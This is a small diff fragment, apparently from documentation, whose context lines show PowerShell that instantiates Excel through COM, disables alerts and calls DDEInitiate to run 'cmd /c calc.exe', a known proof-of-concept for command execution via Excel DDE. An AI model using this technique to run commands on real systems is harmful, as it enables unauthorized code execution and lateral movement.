@@ -21,3 +21,5 @@ $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Applicati
 $excel.DisplayAlerts = $false
 $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")
 ```
+
+
